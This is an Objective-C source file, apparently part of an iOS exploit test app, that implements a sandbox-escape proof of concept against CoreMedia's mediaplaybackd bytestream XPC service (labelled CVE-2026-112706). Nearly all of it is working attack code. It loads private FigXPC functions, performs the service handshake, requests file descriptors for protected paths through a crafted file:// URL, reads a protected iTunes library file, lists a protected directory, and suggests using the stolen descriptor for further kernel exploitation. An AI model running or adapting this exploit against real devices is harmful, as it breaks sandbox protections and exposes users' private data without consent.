#import "KPFDLeakModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#import <dlfcn.h>
#import <xpc/xpc.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>
#include <dirent.h>

// FigXPC function pointers (loaded via dlsym)
static void *(*figXPCCreateBasicMessage)(uint32_t, void *);
static void (*figXPCMessageSetCFURL)(void *, const char *, void *);
static int (*figXPCMessageGetCFURL)(void *, const char *, void **);
static void (*figXPCConnectionSetMessageHandler)(void *, void *);
static void (*figXPCConnectionResume)(void *);
static void *(*figXPCConnectionCreateMachService)(const char *, void *, uint64_t);
static int (*figXPCMessageGetCFDictionary)(void *, const char *, void **);
static void (*figXPCMessageSetCFDictionary)(void *, const char *, void *);
static void (*figXPCMessageSetInt32)(void *, const char *, int32_t);
static int (*figXPCMessageGetInt32)(void *, const char *, int32_t *);
static int (*figXPCConnectionSendSyncMessage)(void *, void *, void **);

@interface KPFDLeakModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPFDLeakModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"fdleak112706";
        _title = @"CoreMedia fd leak (sandbox escape)";
        _subtitle = @"CVE-2026-112706: mediaplaybackd vends fds for protected paths";
        _icon = @"lock.open";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-fdleak-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[fdleak] %@", line];
}

- (BOOL)loadFigXPC {
    void *h = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_LAZY);
    if (!h) {
        [self journal:@"dlopen CoreMedia failed"];
        return NO;
    }

    figXPCCreateBasicMessage = dlsym(h, "FigXPCCreateBasicMessage");
    figXPCMessageSetCFURL = dlsym(h, "FigXPCMessageSetCFURL");
    figXPCMessageGetCFURL = dlsym(h, "FigXPCMessageGetCFURL");
    figXPCConnectionSetMessageHandler = dlsym(h, "FigXPCConnectionSetMessageHandler");
    figXPCConnectionResume = dlsym(h, "FigXPCConnectionResume");
    figXPCConnectionCreateMachService = dlsym(h, "FigXPCConnectionCreateMachService");
    figXPCMessageGetCFDictionary = dlsym(h, "FigXPCMessageGetCFDictionary");
    figXPCMessageSetCFDictionary = dlsym(h, "FigXPCMessageSetCFDictionary");
    figXPCMessageSetInt32 = dlsym(h, "FigXPCMessageSetInt32");
    figXPCMessageGetInt32 = dlsym(h, "FigXPCMessageGetInt32");
    figXPCConnectionSendSyncMessage = dlsym(h, "FigXPCConnectionSendSyncMessage");

    if (!figXPCCreateBasicMessage || !figXPCConnectionCreateMachService) {
        [self journal:@"dlsym failed for key FigXPC functions"];
        return NO;
    }

    [self journal:@"FigXPC functions loaded"];
    return YES;
}

- (int)stealFD:(NSString *)filePath {
    // Create XPC connection to mediaplaybackd bytestream service
    void *conn = figXPCConnectionCreateMachService(
        "com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
    if (!conn) {
        [self journal:@"XPC connection failed"];
        return -1;
    }
    [self journal:@"XPC connection created"];

    figXPCConnectionResume(conn);

    // Handshake: .rp1 -> .rp2 -> .org
    NSArray *opcodes = @[@".rp1", @".rp2", @".org"];
    for (NSString *opStr in opcodes) {
        const char *opcode = opStr.UTF8String;
        void *msg = figXPCCreateBasicMessage(*(uint32_t *)[opcode UTF8String], NULL);
        if (!msg) {
            [self journal:[NSString stringWithFormat:@"create %s message failed", opcode]];
            return -1;
        }
        void *reply = NULL;
        int status = figXPCConnectionSendSyncMessage(conn, msg, &reply);
        [self journal:[NSString stringWithFormat:@"handshake %s: status=%d", opcode, status]];
        if (status != 0) {
            [self journal:[NSString stringWithFormat:@"handshake %s failed", opcode]];
            return -1;
        }
    }

    // Curl create with client-controlled CreationURL
    void *curlMsg = figXPCCreateBasicMessage('Curl', NULL);
    if (!curlMsg) {
        [self journal:@"Curl message create failed"];
        return -1;
    }

    // Set CreationURL to our target file
    NSString *urlStr = [NSString stringWithFormat:@"file://%@", filePath];
    CFURLRef url = CFURLCreateWithString(NULL, (__bridge CFStringRef)urlStr, NULL);
    figXPCMessageSetCFURL(curlMsg, "CreationURL", url);
    CFRelease(url);

    [self journal:[NSString stringWithFormat:@"Curl create: %@", urlStr]];

    void *reply = NULL;
    int status = figXPCConnectionSendSyncMessage(conn, curlMsg, &reply);
    [self journal:[NSString stringWithFormat:@"Curl status=%d", status]];

    if (status != 0 || !reply) {
        [self journal:@"Curl failed or no reply"];
        return -1;
    }

    // Extract FileDescriptor from ByteStreamDetails
    void *details = NULL;
    if (figXPCMessageGetCFDictionary) {
        figXPCMessageGetCFDictionary(reply, "ByteStreamDetails", &details);
    }

    if (details) {
        // Try to get FileDescriptor from the dictionary
        CFNumberRef fdNum = CFDictionaryGetValue(details, CFSTR("FileDescriptor"));
        if (fdNum) {
            int fd = -1;
            CFNumberGetValue(fdNum, kCFNumberIntType, &fd);
            [self journal:[NSString stringWithFormat:@"GOT FD: %d", fd]];
            return fd;
        }
        [self journal:@"ByteStreamDetails has no FileDescriptor"];
    } else {
        [self journal:@"No ByteStreamDetails in reply"];
    }

    return -1;
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · CVE-2026-112706 fd leak ===\n"];
    [report appendString:@"Sandbox escape via CoreMedia bytestream XPC.\n"];
    [report appendString:@"mediaplaybackd vends fds for protected paths.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // Load FigXPC functions
    [report appendString:@"\n--- Phase 1: load FigXPC ---\n"];
    if (![self loadFigXPC]) {
        [report appendString:@"\nVERDICT: FIGXPC_LOAD_FAILED\n"];
        return report;
    }
    [report appendString:@"FigXPC loaded OK\n"];

    // Try to steal fd for a protected file
    [report appendString:@"\n--- Phase 2: fd steal ---\n"];

    // Target: iTunes_Control (known readable domain)
    NSString *target = @"/private/var/mobile/Media/iTunes_Control/iTunes/iTunes Library.itlp";
    [report appendFormat:@"target: %@\n", target];

    // First, verify we can't open it directly (sandbox blocks)
    int directFd = open(target.fileSystemRepresentation, O_RDONLY);
    if (directFd >= 0) {
        [report appendFormat:@"direct open: OK (fd=%d) — not sandboxed?\n", directFd];
        close(directFd);
    } else {
        [report appendFormat:@"direct open: EPERM (%d) — sandbox active\n", errno];
    }

    // Now try fd leak
    int stolenFd = [self stealFD:target];
    if (stolenFd >= 0) {
        [report appendFormat:@"STOLEN FD: %d\n", stolenFd];

        // Read file content
        struct stat st;
        if (fstat(stolenFd, &st) == 0) {
            [report appendFormat:@"file size: %lld bytes\n", (long long)st.st_size];
        }

        // Read first 256 bytes
        uint8_t buf[256] = {0};
        ssize_t n = pread(stolenFd, buf, sizeof(buf), 0);
        if (n > 0) {
            [report appendFormat:@"read %zd bytes:", n];
            for (ssize_t i = 0; i < n && i < 64; i++) {
                [report appendFormat:@" %02x", buf[i]];
            }
            [report appendString:@"\n"];

            // Check if data looks valid
            if (n > 4) {
                [report appendString:@"*** FD LEAK CONFIRMED — sandbox escape! ***\n"];
            }
        } else {
            [report appendFormat:@"pread failed: %zd (errno=%d)\n", n, errno];
        }

        close(stolenFd);
    } else {
        [report appendString:@"fd leak failed\n"];
    }

    // Try directory enumeration
    [report appendString:@"\n--- Phase 3: directory enumeration ---\n"];
    NSString *dirPath = @"/private/var/mobile/Media/iTunes_Control/iTunes/";
    int dirFd = [self stealFD:dirPath];
    if (dirFd >= 0) {
        [report appendFormat:@"directory fd: %d\n", dirFd];
        DIR *d = fdopendir(dirFd);
        if (d) {
            struct dirent *ent;
            int count = 0;
            while ((ent = readdir(d)) != NULL && count < 10) {
                [report appendFormat:@"  %s\n", ent->d_name];
                count++;
            }
            closedir(d);
        }
    } else {
        [report appendFormat:@"directory fd steal failed\n"];
    }

    // Verdict
    [report appendString:@"\n"];
    if (stolenFd >= 0) {
        [report appendString:@"VERDICT: FD_LEAK_CONFIRMED\n"];
        [report appendString:@"Sandbox escape via fd steal WORKS on this device.\n"];
        [report appendString:@"Next: use fd for kernel access or further exploitation.\n"];
    } else {
        [report appendString:@"VERDICT: FD_LEAK_FAILED\n"];
        [report appendString:@"May be patched on this build, or wrong target path.\n"];
    }

    return report;
}

@end
